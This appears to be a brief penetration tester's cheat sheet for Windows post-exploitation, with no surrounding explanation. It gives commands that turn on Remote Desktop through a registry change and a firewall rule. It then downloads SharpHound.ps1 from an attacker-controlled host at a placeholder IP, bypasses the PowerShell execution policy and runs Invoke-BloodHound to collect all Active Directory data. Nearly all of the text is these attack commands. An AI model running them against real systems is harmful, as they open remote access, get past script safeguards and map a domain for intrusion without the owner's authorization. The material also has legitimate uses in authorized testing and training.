Windows: 

### open firewall
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

### Bloodhound 

.\Sharphoun.exe -c all,group 

PS C:\Users\marcus> iwr -uri http://<ip>:8000/SharpHound.ps1 -Outfile SharpHound.ps1
iwr -uri http://<ip>:8000/SharpHound.ps1 -Outfile SharpHound.ps1

PS C:\Users\marcus> powershell -ep bypass

PS C:\Users\marcus> . .\SharpHound.ps1

PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
